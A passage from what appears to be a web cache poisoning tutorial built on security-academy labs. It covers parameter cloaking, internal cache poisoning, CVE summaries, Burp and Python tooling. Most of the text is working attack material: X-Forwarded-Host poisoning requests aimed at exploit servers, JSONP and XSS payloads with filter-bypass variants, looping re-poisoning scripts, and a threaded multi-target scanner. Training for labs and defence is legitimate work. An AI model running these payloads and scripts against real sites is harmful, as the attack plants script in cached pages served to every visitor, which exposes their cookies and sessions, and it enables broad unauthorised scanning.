          (utm_content ignored)      utm_content=foo
                    ↓                callback=alert(1) [WINS!]
                    ↓                   ↓
            Stores response      Returns:
            as "setCountryCookie"  alert(1)({...})
                    ↓                   ↓
                    └─────────┬─────────┘
                              ↓
                    Next Request:
                    /js/geolocate.js?callback=setCountryCookie
                              ↓
                    Cache Hit: alert(1)({...})
                              ↓
                          XSS EXECUTES
```

### Key Concepts

**Parameter Cloaking**:
- Exploits discrepancies in parameter parsing
- Cache and backend interpret parameters differently
- Allows hiding malicious parameters within excluded parameters

**Ruby on Rails Parameter Parsing**:
```ruby
# Rails accepts ; as parameter separator
/path?a=1;b=2
# Parsed as: {a: "1", b: "2"}
```

**Cache Key vs Backend Parsing**:
```
URL: ?param1=a&param2=b;param3=c

Cache Key:
  param1=a
  param2=b;param3=c  (treated as single value)

Backend (Rails):
  param1=a
  param2=b
  param3=c  (semicolon creates new parameter!)
```

**Parameter Precedence**:
When duplicate parameters exist, different frameworks handle them differently:
- PHP: Uses last occurrence
- Rails: Uses last occurrence
- Express.js: Creates array
- ASP.NET: Uses first occurrence

### Burp Suite Features

**Param Miner - Rails Parameter Cloaking Scan**:
```
1. Right-click request
2. Extensions → Param Miner → "Rails parameter cloaking scan"
3. Automatically tests semicolon-based cloaking
4. Reports vulnerable parameters
```

**Manual Testing in Repeater**:
```
1. Identify unkeyed parameter (utm_content)
2. Identify target parameter (callback)
3. Combine: utm_content=foo;callback=payload
4. Test with cache-buster
5. Remove cache-buster and poison
```

### Common Mistakes

1. **Not understanding parameter precedence**
   - Issue: First `callback` in URL might take precedence
   - Fix: Test which occurrence the backend uses

2. **Incorrect syntax**
   - Wrong: `utm_content=foo&callback=evil` (two parameters)
   - Right: `utm_content=foo;callback=evil` (cloaked)

3. **Forgetting the original parameter**
   - Issue: `/js/geolocate.js?utm_content=;callback=alert(1)`
   - Fix: Include original: `?callback=setCountryCookie&utm_content=;callback=alert(1)`

4. **Not maintaining cache key**
   - Issue: Changing the keyed parameter
   - Fix: Keep `callback=setCountryCookie` in URL

### Advanced Techniques

**Parameter Pollution Variations**:

```bash
# Standard separator
?param1=a&param2=b

# Rails semicolon separator
?param1=a;param2=b

# Encoded semicolon
?param1=a%3Bparam2=b

# Mixed separators
?param1=a&param2=b;param3=c
```

**Automated Detection Script**:
```python
import requests

def test_parameter_cloaking(url, unkeyed_param, target_param):
    # Test normal request
    r1 = requests.get(f"{url}?{target_param}=normal")
    normal_response = r1.text

    # Test cloaked request
    cloaked_url = f"{url}?{target_param}=normal&{unkeyed_param}=foo;{target_param}=cloaked"
    r2 = requests.get(cloaked_url)
    cloaked_response = r2.text

    # Check if cloaked value appears in response
    if "cloaked" in cloaked_response and "normal" not in cloaked_response:
        print("[!] Parameter cloaking successful!")
        print(f"[!] {target_param} can be cloaked via {unkeyed_param}")
        return True
    return False

# Example usage
test_parameter_cloaking(
    "https://target.com/js/geolocate.js",
    "utm_content",
    "callback"
)
```

**Framework-Specific Cloaking**:

| Framework | Separator | Example |
|-----------|-----------|---------|
| Ruby on Rails | `;` | `?utm=1;callback=evil` |
| Apache/PHP | `;` | `?utm=1;callback=evil` |
| IIS/ASP.NET | `;` (sometimes) | `?utm=1;callback=evil` |
| Node.js/Express | None | Not vulnerable by default |

**Cache Poisoning Maintenance**:
```python
import time

def maintain_poison(url, payload):
    while True:
        r = requests.get(url + payload)
        if 'X-Cache: hit' in str(r.headers):
            print("[+] Cache poisoned successfully")
        else:
            print("[-] Re-poisoning...")
        time.sleep(25)  # Re-poison before cache expires
```

---

## Lab 8: Internal Cache Poisoning

**Difficulty**: Expert
**Objective**: Poison the internal cache so the home page executes `alert(document.cookie)` by exploiting multi-layered caching

### Vulnerability Description

The application employs **multiple caching layers** (external and internal) with flawed cache key implementations:
- **External cache**: Includes query strings and headers in keys
- **Internal cache**: Fails to include certain headers (X-Forwarded-Host) in keys
- This discrepancy allows poisoning the internal cache even when external cache uses unique keys

### Understanding Multi-Layered Caching

```
User Request
     ↓
External Cache (CDN)
     ↓ (on miss)
Internal Cache (Origin)
     ↓ (on miss)
Backend Application
```

**Problem**: Different cache keys at each layer!

### Step-by-Step Solution

**Step 1: Identify Cache Behavior**

Test the homepage:

```http
GET / HTTP/1.1
Host: ac1f1f941e078c74802a1b5a00e70083.web-security-academy.net
```

**Response**:
```html
<script src="/js/geolocate.js?callback=setCountryCookie"></script>
```

Observe that changing query strings affects caching (query string is in external cache key).

**Step 2: Configure Param Miner for Multi-Layer Testing**

1. Right-click request in Repeater
2. Extensions → Param Miner → Options
3. Enable "Add dynamic cachebuster"
4. This adds unique query parameters to bypass external cache

**Dynamic Cache-Buster**:
```http
GET /?cb=TIMESTAMP HTTP/1.1
```

The external cache sees each request as unique, allowing testing of internal cache behavior.

**Step 3: Test X-Forwarded-Host with Cache-Buster**

**Request**:
```http
GET /?cb=12345 HTTP/1.1
Host: ac1f1f941e078c74802a1b5a00e70083.web-security-academy.net
X-Forwarded-Host: example.com
```

**Response**:
```html
<script src="//example.com/js/geolocate.js?callback=setCountryCookie"></script>
```

The header affects the response!

**Step 4: Observe Internal Cache Behavior**

Send multiple requests with the **same cache-buster** but **different X-Forwarded-Host**:

**Request 1**:
```http
GET /?cb=99999 HTTP/1.1
X-Forwarded-Host: exploit-server.net
```

**Request 2** (moments later):
```http
GET /?cb=99999 HTTP/1.1
X-Forwarded-Host: different-server.net
```

**Key Observation**:
- External cache: Miss (unique cb value)
- Internal cache: Hit! (X-Forwarded-Host not in internal key)
- Response still shows first exploit-server.net

This proves **internal caching exists** and **doesn't key on X-Forwarded-Host**!

**Step 5: Identify Internal Cache Fragments**

The application caches fragments separately:

```html
<!-- Fragment 1: Base HTML -->
<html>...

<!-- Fragment 2: Geolocate script (CACHED INTERNALLY) -->
<script src="/js/geolocate.js?..."></script>

<!-- Fragment 3: Tracking script (CACHED INTERNALLY) -->
<script src="/resources/js/tracking.js"></script>
```

Each fragment may have different internal cache keys!

**Step 6: Poison Internal Cache for Geolocate**

Strategy:
1. Use dynamic cache-buster to bypass external cache
2. Repeatedly send requests with malicious X-Forwarded-Host
3. Wait for internal cache to store the poisoned fragment

**Poisoning Requests** (send multiple times):
```http
GET /?cb=RANDOM1 HTTP/1.1
Host: ac1f1f941e078c74802a1b5a00e70083.web-security-academy.net
X-Forwarded-Host: exploit-0a4100e103f88c9280121aa401cb00ad.exploit-server.net
```

```http
GET /?cb=RANDOM2 HTTP/1.1
X-Forwarded-Host: exploit-0a4100e103f88c9280121aa401cb00ad.exploit-server.net
```

```http
GET /?cb=RANDOM3 HTTP/1.1
X-Forwarded-Host: exploit-0a4100e103f88c9280121aa401cb00ad.exploit-server.net
```

**Step 7: Verify Internal Cache Poisoning**

Remove X-Forwarded-Host and check if poisoning persists:

```http
GET /?cb=RANDOM4 HTTP/1.1
# No X-Forwarded-Host header!
```

**Response**:
```html
<script src="//exploit-0a4100e103f88c9280121aa401cb00ad.exploit-server.net/js/geolocate.js"></script>
```

The internal cache still returns the poisoned URL!

**Step 8: Create Exploit Payload**

On exploit server, create `/js/geolocate.js`:

```javascript
alert(document.cookie)
```

**Step 9: Poison for Production**

Remove cache-busters and poison the cache for the clean URL:

```http
GET / HTTP/1.1
Host: ac1f1f941e078c74802a1b5a00e70083.web-security-academy.net
X-Forwarded-Host: exploit-0a4100e103f88c9280121aa401cb00ad.exploit-server.net
```

Send this repeatedly until all fragments are poisoned.

**Step 10: Monitor and Maintain**

Check if all script URLs point to exploit server:

```bash
# Check geolocate.js
curl -s https://target.com/ | grep geolocate

# Check tracking.js
curl -s https://target.com/ | grep tracking

# Both should point to exploit server
```

Continue sending poisoning requests to maintain the state.

**Step 11: Verification**

Visit the homepage in a browser:
1. Page loads
2. Requests `/js/geolocate.js` from exploit server
3. Executes `alert(document.cookie)`
4. XSS successful!

### Attack Flow Diagram

```
Initial State:
    User → External Cache → Internal Cache → Backend
                               ↓
                    geolocate.js URL: /js/geolocate.js

Poisoning Phase:
    Attacker requests with X-Forwarded-Host + cache-buster
         ↓
    External Cache (miss - unique cache-buster)
         ↓
    Internal Cache (key doesn't include X-Forwarded-Host)
         ↓
    Backend returns: //exploit-server/js/geolocate.js
         ↓
    Internal Cache stores poisoned fragment

Exploitation Phase:
    Victim → External Cache (hit - clean URL)
         ↓
    Assembles response from:
         - External cache (base HTML)
         - Internal cache (poisoned geolocate.js fragment)
         ↓
    Response: <script src="//exploit-server/js/geolocate.js"></script>
         ↓
    Browser loads malicious script
         ↓
    alert(document.cookie) EXECUTES
```

### Key Concepts

**Multi-Layered Caching**:
- Different cache systems with different rules
- CDNs (external) + Origin caching (internal)
- Each layer may use different cache keys

**Cache Key Discrepancies**:
```
External Cache Key:
  - Method
  - Host
  - Path
  - Query String
  - Some Headers

Internal Cache Key:
  - Method
  - Host
  - Path
  - Query String
  - X-Forwarded-Host NOT included! [VULNERABILITY]
```

**Fragment Caching**:
- Applications cache page fragments separately
- Each fragment may have independent cache behavior
- Headers, footers, scripts can be cached independently

**Cache-Buster Techniques**:

| Type | Example | Purpose |
|------|---------|---------|
| Static | `?cb=123` | Consistent testing |
| Dynamic | `?cb=TIMESTAMP` | Bypass external cache |
| Random | `?cb=RANDOM()` | Each request unique |

### Burp Suite Features

**Param Miner - Dynamic Cache-Buster**:
```
Options:
  ☑ Add dynamic cachebuster
  Parameter name: cb
  Parameter value: ${RANDOM}
```

**Repeater - Multi-Request Testing**:
```
1. Send request with X-Forwarded-Host + cache-buster
2. Change cache-buster, keep X-Forwarded-Host
3. Send again - if internal cache hit, behavior unchanged
4. Remove X-Forwarded-Host
5. Send again - if still poisoned, internal cache confirmed
```

**Turbo Intruder - Automated Poisoning**:
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=1,
                          requestsPerConnection=100,
                          pipeline=False)

    for i in range(100):
        engine.queue(target.req, gate='race1')

    engine.openGate('race1')

def handleResponse(req, interesting):
    if 'exploit-server' in req.response:
        table.add(req)
```

### Common Mistakes

1. **Not using dynamic cache-busters**
   - Issue: External cache prevents reaching internal cache
   - Fix: Use `?cb=TIMESTAMP` to bypass external layer

2. **Testing too quickly**
   - Issue: Internal cache needs time to store fragments
   - Fix: Send requests with pauses (2-3 seconds between)

3. **Not checking all fragments**
   - Issue: Multiple script/resource fragments may exist
   - Fix: Verify all dynamic resources point to exploit server

4. **Assuming single cache layer**
   - Issue: Only considering external CDN behavior
   - Fix: Test for internal caching with header variations

### Advanced Techniques

**Cache Layer Detection**:
```python
import requests
import time

def detect_cache_layers(url):
    # Test 1: Same request twice
    r1 = requests.get(url)
    time.sleep(1)
    r2 = requests.get(url)

    # Test 2: Same request with header variation
    r3 = requests.get(url, headers={'X-Forwarded-Host': 'test.com'})
    r4 = requests.get(url, headers={'X-Forwarded-Host': 'test.com'})

    # Test 3: Header variation with cache-buster
    r5 = requests.get(f"{url}?cb=1", headers={'X-Forwarded-Host': 'test.com'})
    r6 = requests.get(f"{url}?cb=2", headers={'X-Forwarded-Host': 'test.com'})

    print("Test 1 - Basic caching:",
          'X-Cache: hit' in str(r2.headers))
    print("Test 2 - Header affects caching:",
          r3.text != r4.text)
    print("Test 3 - Internal cache exists:",
          'test.com' in r6.text)
```

**Fragment Cache Timing**:
```bash
# Monitor cache behavior over time
for i in {1..20}; do
  echo "Request $i"
  curl -s https://target.com/?cb=$i \
       -H "X-Forwarded-Host: exploit.net" | \
       grep -o 'src="[^"]*exploit' | \
       sort -u
  sleep 2
done
```

**Multi-Fragment Poisoning**:
```python
def poison_all_fragments(base_url, exploit_host):
    fragments = [
        '/',
        '/products',
        '/about',
        '/contact'
    ]

    for fragment in fragments:
        for i in range(20):
            requests.get(
                f"{base_url}{fragment}?cb={i}",
                headers={'X-Forwarded-Host': exploit_host}
            )
            time.sleep(1)

    print("[+] All fragments poisoned")
```

**Cache State Verification**:
```bash
# Check if internal cache is poisoned
curl -H "X-Cache-Test: 1" https://target.com/?nocache=1

# Should still show exploit server if internal cache poisoned
# Even though external cache bypassed
```

---

## Attack Techniques

### Unkeyed Input Discovery

**Manual Testing**:
```http
# Test common headers
X-Forwarded-Host: example.com
X-Forwarded-Scheme: http
X-Forwarded-Proto: http
X-Original-URL: /admin
X-Rewrite-URL: /admin
X-Forwarded-Server: example.com
X-Host: example.com
X-HTTP-Host-Override: example.com
Forwarded: for=attacker.com
```

**Automated with Param Miner**:
1. Right-click request
2. Extensions → Param Miner → "Guess headers"
3. Review results for reflected headers

**Identifying Unkeyed Status**:
```python
def is_unkeyed(url, header_name, value1, value2):
    # Request 1
    r1 = requests.get(url, headers={header_name: value1})

    # Request 2 with different value
    r2 = requests.get(url, headers={header_name: value2})

    # If second request is cached despite different header value,
    # the header is unkeyed
    return 'X-Cache: hit' in str(r2.headers)
```

### Cache Behavior Analysis

**Cache Headers to Monitor**:

| Header | Meaning | Importance |
|--------|---------|------------|
| X-Cache | hit/miss | Indicates cache status |
| Age | Seconds cached | Time since caching |
| Cache-Control | Cache rules | max-age, no-cache, etc. |
| Vary | Headers affecting cache | Which headers are keyed |
| X-Cache-Hits | Number of hits | Popularity indicator |
| CF-Cache-Status | Cloudflare status | HIT, MISS, EXPIRED, BYPASS |

**Testing Cache Expiration**:
```bash
# Send request
curl -I https://target.com/

# Note Age header
Age: 45

# Wait and check again
sleep 10
curl -I https://target.com/

# Age should increase
Age: 55
```

**Cache Key Normalization**:

Some caches normalize inputs:
```
/path\to\resource  →  /path/to/resource
/path/../admin     →  /admin
/path//resource    →  /path/resource
```

Test with:
```http
GET /setlang\es HTTP/1.1
GET /setlang%5Ces HTTP/1.1  # URL-encoded backslash
```

### Exploitation Patterns

**Pattern 1: Direct Unkeyed Header**
```
1. Find unkeyed header (X-Forwarded-Host)
2. Identify reflection point (script src)
3. Create malicious resource
4. Poison cache
```

**Pattern 2: Multi-Header Combination**
```
1. Find multiple unkeyed headers
2. Combine for desired effect
3. X-Forwarded-Host + X-Forwarded-Scheme
4. Poison cache
```

**Pattern 3: Unkeyed Parameter**
```
1. Find unkeyed query parameter
2. Identify reflection point
3. Inject payload
4. Poison cache
```

**Pattern 4: Parameter Cloaking**
```
1. Find unkeyed parameter
2. Find target keyed parameter
3. Hide target in unkeyed: utm_content=1;target=evil
4. Poison cache
```

**Pattern 5: Multi-Layer Cache**
```
1. Identify cache layers
2. Use cache-buster for outer layer
3. Poison inner layer
4. Remove cache-buster
```

### Payload Strategies

**For X-Forwarded-Host in JavaScript src**:
```html
<!-- Original: -->
<script src="//website.com/script.js"></script>

<!-- Poisoned: -->
X-Forwarded-Host: exploit-server.net
<!-- Result: -->
<script src="//exploit-server.net/script.js"></script>
```

**For Reflected Parameters in HTML**:
```html
<!-- Original: -->
<link href="//site.com/?param=VALUE" />

<!-- Inject: -->
?param='/><script>alert(1)</script>

<!-- Result: -->
<link href="//site.com/?param='/><script>alert(1)</script>" />
```

**For Reflected Parameters in JavaScript**:
```javascript
// Original:
var param = 'VALUE';

// Inject:
?param=';alert(1);//

// Result:
var param = '';alert(1);//';
```

**For Cookie-Based Reflection**:
```javascript
// Original:
data = {"host":"prod-cache-01"}

// Inject:
Cookie: fehost=";alert(1)//

// Result:
data = {"host":"";alert(1)//"}
```

### Bypass Techniques

**Bypassing WAF/Filters**:

1. **Encoding variations**:
```
<script>alert(1)</script>
%3Cscript%3Ealert(1)%3C/script%3E
<SCRipT>alert(1)</sCRiPt>
<script>alert(String.fromCharCode(49))</script>
```

2. **Alternative event handlers**:
```html
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<iframe onload=alert(1)>
```

3. **Template literals**:
```javascript
${alert(1)}
${alert`1`}
${alert(document.cookie)}
```

4. **HTML entities**:
```html
&#60;script&#62;alert(1)&#60;/script&#62;
&lt;script&gt;alert(1)&lt;/script&gt;
```

**Cache Key Variations**:
```http
# Try different paths
GET /path HTTP/1.1
GET /path/ HTTP/1.1
GET /./path HTTP/1.1
GET /path/. HTTP/1.1

# Try different methods
GET /resource HTTP/1.1
POST /resource HTTP/1.1
HEAD /resource HTTP/1.1
```

**Header Variations**:
```http
# Standard
X-Forwarded-Host: evil.com

# With port
X-Forwarded-Host: evil.com:80

# With protocol
X-Forwarded-Host: http://evil.com

# With path (sometimes stripped)
X-Forwarded-Host: evil.com/path
```

### Cache Poisoning Maintenance

**Automated Re-Poisoning Script**:
```python
import requests
import time

def maintain_cache_poison(url, headers, interval=25):
    """
    Continuously re-poison cache before expiration
    """
    while True:
        try:
            r = requests.get(url, headers=headers)

            if 'X-Cache: hit' in str(r.headers):
                print(f"[+] Cache poisoned at {time.ctime()}")
            else:
                print(f"[-] Re-poisoning at {time.ctime()}")

            # Check Age header to optimize timing
            age = r.headers.get('Age', '0')
            print(f"    Age: {age} seconds")

            time.sleep(interval)

        except Exception as e:
            print(f"[!] Error: {e}")
            time.sleep(5)

# Example usage
maintain_cache_poison(
    "https://target.com/",
    {"X-Forwarded-Host": "exploit-server.net"},
    interval=25
)
```

**Burp Suite Turbo Intruder**:
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=1,
        requestsPerConnection=1000,
        pipeline=False
    )

    # Continuous poisoning
    for i in range(1000):
        engine.queue(target.req)
        time.sleep(25)  # Re-poison every 25 seconds

def handleResponse(req, interesting):
    if 'X-Cache: hit' in req.response:
        table.add(req)
```

---

## Real-World CVE Examples

### CVE-2020-4896 - IBM Emptoris Sourcing

**Severity**: Medium
**CVSS Score**: 6.1
**Affected**: IBM Emptoris Sourcing 10.1.0, 10.1.1, 10.1.3

**Description**:
Vulnerable to web cache poisoning through improper input validation when modifying HTTP request headers.

**Attack Vector**:
```http
GET /page HTTP/1.1
Host: emptoris.example.com
X-Forwarded-Host: attacker.com
```

**Impact**:
- XSS attacks through cached responses
- Session hijacking
- Phishing attacks

---

### CVE-2020-4828 - IBM API Connect

**Severity**: Medium
**CVSS Score**: 6.1
**Affected**: IBM API Connect 10.0.0.0-10.0.1.0, 2018.4.1.0-2018.4.1.13

**Description**:
Web cache poisoning vulnerability caused by improper validation of HTTP request headers.

**Attack Vector**:
```http
GET /api/endpoint HTTP/1.1
Host: api.example.com
X-Forwarded-Host: malicious.com
```

**Exploitation**:
1. Attacker crafts request with malicious X-Forwarded-Host
2. Cache stores poisoned response
3. Victims receive XSS payload from cached response
4. API consumers affected

**Impact**:
- API poisoning affecting multiple consumers
- Credential theft
- Man-in-the-middle attacks

---

### CVE-2021-29479 - Ratpack

**Severity**: Medium
**CVSS Score**: 5.3
**Affected**: Ratpack < 1.9.0

**Description**:
X-Forwarded-Host header can be used for cache poisoning if not included in cache key. Leads to redirect cache poisoning.

**Attack Vector**:
```http
GET /redirect HTTP/1.1
Host: ratpack-app.com
X-Forwarded-Host: evil.com
```

**Response**:
```http
HTTP/1.1 302 Found
Location: https://evil.com/intended-path
```

**Exploitation Flow**:
```
1. Attacker poisons cache with evil.com redirect
2. Legitimate users hit poisoned cache
3. Redirected to attacker-controlled site
4. Phishing/credential harvesting
```

**Impact**:
- Open redirect exploitation
- Phishing attacks
- Session token theft

**Fix**: Version 1.9.0+ includes X-Forwarded-Host in cache key

---

### CVE-2020-28473 - Bottle (Python Framework)

**Severity**: Medium
**CVSS Score**: 5.3
**Affected**: Bottle < 0.12.19

**Description**:
Parameter cloaking vulnerability. Semicolon (;) allows separating query parameters, causing cache/server interpretation discrepancies.

**Attack Vector**:
```http
GET /api?safe_param=value;callback=malicious HTTP/1.1
```

**Cache sees**: `safe_param=value;callback=malicious` (one parameter)
**Bottle sees**: `safe_param=value` AND `callback=malicious` (two parameters)

**Exploitation**:
```python
# Vulnerable code
from bottle import request, route

@route('/api')
def api():
    callback = request.query.callback or 'default'
    return f"{callback}({{data}})"
```

**Attack**:
```http
GET /api?safe=1;callback=alert HTTP/1.1
```

**Result**:
```javascript
alert({data})  // XSS executed
```

**Impact**:
- XSS through JSONP callbacks
- Cache poisoning
- Parameter smuggling

---

### CVE-2021-23336 - Python cpython

**Severity**: Medium
**CVSS Score**: 5.9
**Affected**: Python < 3.9.2, < 3.8.8, < 3.7.10, < 3.6.13

**Description**:
The `parse_qsl()` function parses URL query parameters using semicolon AND ampersand as delimiters, enabling cache poisoning.

**Vulnerable Code**:
```python
from urllib.parse import parse_qsl

# Input: param1=a;param2=b
result = parse_qsl("param1=a;param2=b")
# Result: [('param1', 'a'), ('param2', 'b')]
```

**Attack in Tornado Framework**:
```http
GET /handler?safe=ok;redirect_uri=https://evil.com HTTP/1.1
```

**Exploitation**:
1. Cache keys on `safe=ok;redirect_uri=https://evil.com`
2. Application parses as two parameters
3. `redirect_uri=https://evil.com` used in redirect
4. Victims get redirected to attacker site

**Impact**:
- Cache poisoning in Python web applications
- Open redirect vulnerabilities
- Parameter smuggling

**Affected Frameworks**:
- Tornado
- Django (partial)
- Flask (partial)
- Any framework using `parse_qsl()`

**Fix**: Python 3.9.2+ uses only `&` as separator by default

---

### CVE-2020-5401 - CloudFoundry Gorouter

**Severity**: High
**CVSS Score**: 7.5
**Type**: Cache Poisoning DoS (CPDoS)

**Description**:
CloudFoundry Gorouter vulnerable to cache-poisoned denial of service through oversized header manipulation.

**Attack Vector**:
```http
GET / HTTP/1.1
Host: app.cloudfoundry.com
X-Forwarded-For: 1.2.3.4
X-Forwarded-Proto: https
X-Oversized-Header: [100KB of data]
```

**Exploitation**:
1. Attacker sends request with oversized header
2. Backend rejects request (400/413/502 error)
3. Cache stores error response
4. Legitimate users receive error from cache
5. Application becomes unavailable (DoS)

**Impact**:
- Denial of Service
- Application unavailability
- Business disruption

**CPDoS Variants**:
- **HHO (HTTP Header Oversize)**: Oversized headers
- **HMC (HTTP Meta Character)**: Special characters in headers
- **HMO (HTTP Method Override)**: Invalid method overrides

---

### CVE-2020-29022 - Secomea GateManager

**Severity**: Medium
**CVSS Score**: 6.1
**Affected**: Secomea GateManager versions prior to 9.7

**Description**:
Failure to sanitize Host header value on output enables web cache poisoning attacks.

**Attack Vector**:
```http
GET /login HTTP/1.1
Host: <script>alert(document.cookie)</script>
```

**Response**:
```html
<link rel="canonical" href="https://<script>alert(document.cookie)</script>/login">
```

**Exploitation**:
1. Host header reflected in response
2. Cache stores poisoned response
3. XSS executes for cached users

**Impact**:
- Reflected XSS through cache
- Session hijacking
- Credential theft

---

### CVE-2021-41267 - Symfony/Http-Kernel

**Severity**: Medium
**CVSS Score**: 5.3
**Affected**: Symfony 5.2.0-5.3.14

**Description**:
X-Forwarded-Prefix header accessible in SubRequest even when not in trusted_headers list, enabling cache poisoning.

**Vulnerable Configuration**:
```php
// config/packages/framework.yaml
framework:
    trusted_headers: ['x-forwarded-for', 'x-forwarded-host']
    # x-forwarded-prefix NOT trusted, but still accessible!
```

**Attack Vector**:
```http
GET /page HTTP/1.1
Host: symfony-app.com
X-Forwarded-Prefix: /../../evil
```

**Exploitation**:
```php
// In controller
$request->getPathInfo();
// Returns: /../../evil/page instead of /page
```

**Impact**:
- Path traversal through cache
- Routing manipulation
- Unauthorized access

**Fix**: Symfony 5.3.15+ properly validates trusted_headers

---

## Tools and Automation

### Burp Suite Extensions

#### 1. Param Miner

**Installation**:
1. Burp → Extender → BApp Store
2. Search "Param Miner"
3. Install

**Features**:
- Guess headers
- Guess GET/POST parameters
- Guess cookies
- Rails parameter cloaking scan
- Dynamic cache-buster

**Usage**:
```
Right-click request → Extensions → Param Miner →
  - Guess headers
  - Guess GET parameters
  - Guess POST parameters
  - Rails parameter cloaking scan
```

**Configuration**:
```
Param Miner → Options:
  ☑ Add dynamic cachebuster
  ☑ Add static cachebuster
  ☑ Skip boring words
  ☑ Enable auto-mine

  Cachebuster parameter: cb
  Max header length: 50
  Max param length: 50
```

**Output**:
```
[Param Miner] Testing headers...
[Param Miner] X-Forwarded-Host is supported
[Param Miner] X-Forwarded-Host causes response differences
[Param Miner] X-Forwarded-Host may be unkeyed
[Param Miner] utm_content parameter is reflected
[Param Miner] utm_content appears to be unkeyed
```

#### 2. Turbo Intruder

**Purpose**: High-speed request sending for cache poisoning maintenance

**Installation**: BApp Store → Turbo Intruder

**Continuous Poisoning Script**:
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=1,
        requestsPerConnection=1,
        pipeline=False
    )

    # Poison every 25 seconds
    for i in range(100):
        engine.queue(target.req)
        engine.queue(target.req, pauseBefore=25000)  # 25 second pause

def handleResponse(req, interesting):
    # Log successful cache hits
    if 'X-Cache: hit' in req.response:
        table.add(req)
```

**Race Condition Script** (for timing attacks):
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=50,
        requestsPerConnection=100,
        pipeline=False
    )

    # Send burst of requests
    for i in range(100):
        engine.queue(target.req, gate='race1')

    # Release all at once
    engine.openGate('race1')

def handleResponse(req, interesting):
    table.add(req)
```

#### 3. HTTP Request Smuggler

**Purpose**: Detect request smuggling issues that can lead to cache poisoning

**Usage**:
1. Right-click request
2. Extensions → HTTP Request Smuggler → "Smuggle probe"

**Relevant to cache poisoning** when:
- Request smuggling allows bypassing cache
- Poisoning backend via smuggled requests

#### 4. Additional Useful Extensions

**Logger++**: Enhanced logging for tracking cache behavior
```
- Log X-Cache headers
- Log Age headers
- Track cache hits/misses over time
```

**Autorize**: Test authorization with poisoned caches
**Content-Type Converter**: Test different content types in cache

### Command-Line Tools

#### 1. cURL

**Basic Cache Testing**:
```bash
# Check cache headers
curl -I https://target.com/

# Test with custom header
curl -I https://target.com/ \
  -H "X-Forwarded-Host: evil.com"

# Follow redirects
curl -IL https://target.com/ \
  -H "X-Forwarded-Scheme: nothttps"

# Save response headers
curl -D headers.txt https://target.com/

# Multiple requests to test caching
for i in {1..5}; do
  curl -I https://target.com/ \
    -H "X-Forwarded-Host: evil.com"
  sleep 2
done
```

**Cache Poisoning Script**:
```bash
#!/bin/bash

URL="https://target.com/"
HEADER="X-Forwarded-Host: exploit-server.net"

while true; do
  RESPONSE=$(curl -sI "$URL" -H "$HEADER")

  if echo "$RESPONSE" | grep -q "X-Cache: hit"; then
    echo "[+] Cache poisoned at $(date)"
  else
    echo "[-] Re-poisoning..."
  fi

  sleep 25
done
```

#### 2. HTTPie

**Cleaner syntax than cURL**:
```bash
# Basic request
http https://target.com/ X-Forwarded-Host:evil.com

# JSON output
http --json https://target.com/api

# Follow redirects
http --follow https://target.com/

# Custom method
http POST https://target.com/ X-Custom:value
```

#### 3. Python Requests

**Comprehensive Testing Script**:
```python
import requests
import time

class CachePoisonTester:
    def __init__(self, base_url):
        self.base_url = base_url
        self.session = requests.Session()

    def test_unkeyed_header(self, header_name, test_value):
        """Test if header is unkeyed"""
        # Request 1
        r1 = self.session.get(
            self.base_url,
            headers={header_name: test_value}
        )

        # Request 2 with different value
        time.sleep(1)
        r2 = self.session.get(
            self.base_url,
            headers={header_name: f"{test_value}_different"}
        )

        # Check if cached despite different value
        if 'X-Cache' in r2.headers:
            cache_status = r2.headers['X-Cache']
            if cache_status == 'hit':
                print(f"[!] {header_name} is UNKEYED")
                return True

        return False

    def test_reflection(self, header_name, marker):
        """Test if header value is reflected"""
        r = self.session.get(
            self.base_url,
            headers={header_name: marker}
        )

        if marker in r.text:
            print(f"[+] {header_name} is REFLECTED")
            return True
        return False

    def poison_cache(self, headers, duration=30):
        """Continuously poison cache"""
        start_time = time.time()
        attempts = 0

        while time.time() - start_time < duration:
            r = self.session.get(self.base_url, headers=headers)
            attempts += 1

            if 'X-Cache' in r.headers:
                cache_status = r.headers['X-Cache']
                print(f"[{attempts}] Cache status: {cache_status}")

                if cache_status == 'hit':
                    print("[+] Cache successfully poisoned!")
                    return True

            time.sleep(2)

        return False

    def verify_poisoning(self):
        """Check if cache is poisoned without attack headers"""
        r = self.session.get(self.base_url)
        return "exploit-server" in r.text

# Usage
tester = CachePoisonTester("https://target.com/")

# Test headers
headers_to_test = [
    'X-Forwarded-Host',
    'X-Forwarded-Scheme',
    'X-Original-URL',
    'X-Rewrite-URL'
]

for header in headers_to_test:
    if tester.test_reflection(header, "testmarker123"):
        if tester.test_unkeyed_header(header, "testvalue"):
            print(f"[!] VULNERABLE: {header}")

# Poison cache
tester.poison_cache({'X-Forwarded-Host': 'exploit-server.net'})

# Verify
if tester.verify_poisoning():
    print("[+] Cache poisoning successful!")
```

#### 4. Custom Automation Scripts

**Multi-Target Scanner**:
```python
import requests
from concurrent.futures import ThreadPoolExecutor
import sys

def test_target(url):
    """Test single target for cache poisoning"""
    test_headers = {
        'X-Forwarded-Host': 'cache-poison-test.com',
        'X-Forwarded-Scheme': 'nothttps',
        'X-Original-URL': '/test',
    }

    results = {}

    for header_name, header_value in test_headers.items():
        try:
            # Send test request
            r = requests.get(
                url,
                headers={header_name: header_value},
                timeout=10
            )

            # Check reflection
            if header_value in r.text:
                results[header_name] = "REFLECTED"

            # Check cache headers
            if 'X-Cache' in r.headers or 'CF-Cache-Status' in r.headers:
                results[f"{header_name}_cacheable"] = True

        except Exception as e:
            pass

    if results:
        print(f"\n[+] {url}")
        for key, value in results.items():
            print(f"    {key}: {value}")

# Read targets from file
with open('targets.txt', 'r') as f:
    urls = [line.strip() for line in f if line.strip()]

# Concurrent testing
with ThreadPoolExecutor(max_workers=10) as executor:
    executor.map(test_target, urls)
```

**Cache Timing Analyzer**:
```python
import requests
import time
import statistics

def analyze_cache_timing(url, num_requests=20):
    """Analyze cache behavior through timing"""
    times = []
    cache_statuses = []

    for i in range(num_requests):
        start = time.time()
        r = requests.get(url)
        elapsed = time.time() - start

        times.append(elapsed)

        cache_status = r.headers.get('X-Cache', 'unknown')
        cache_statuses.append(cache_status)

